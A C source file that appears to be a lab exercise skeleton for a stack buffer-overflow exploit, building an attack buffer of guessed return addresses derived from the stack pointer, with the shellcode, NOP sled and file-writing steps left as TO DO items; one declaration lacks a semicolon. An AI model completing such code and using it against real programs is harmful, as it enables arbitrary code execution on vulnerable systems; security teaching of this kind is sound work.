#include <string.h>
#include <stdio.h>
#include <stdlib.h>
//Proof and error to know the offsetChosen of the "jump"
#define CHOSEN_OFFSET 300 

unsigned char code[] = /* TO DO-- binary code of the exploit previously created ---*/;

//The program locates itself. It gets ESP address
unsigned long jumpBegins(void){
     __asm__("movl %esp,%eax");
}

void main(int argc, char **argv){
	char buffer[517];
	FILE *attackfile;
	char *ptr;
	long *a_ptr
	long address;
	int offsetChosen = CHOSEN_OFFSET;

	/* TO DO--Initialize buffer with 0x90 (NOP instruction) */

	//--------BEGIN FILL BUFFER

	address = jumpBegins()+offsetChosen;

	//Store the buffer value (beginning of the place where the vulnerable program input is stored)
	ptr = buffer;
	a_ptr = (long *) ptr;

	int i;
	// We copy the address that we think is of the shellcode
	for (i = 0; i < 300;i+=4){
		*(a_ptr++) = address;
	}
	
	/* TO DO--Copy the shellcode in the address that we assume is the right one
	The code is located almost at the end of the buffer*/

	//end of the string
	buffer[sizeof(buffer) - 1] = '\0';
	//--------END FILL BUFFER

	/* TO DO-- Save the contents to the file "fileToRead" which contains the attack*/
}
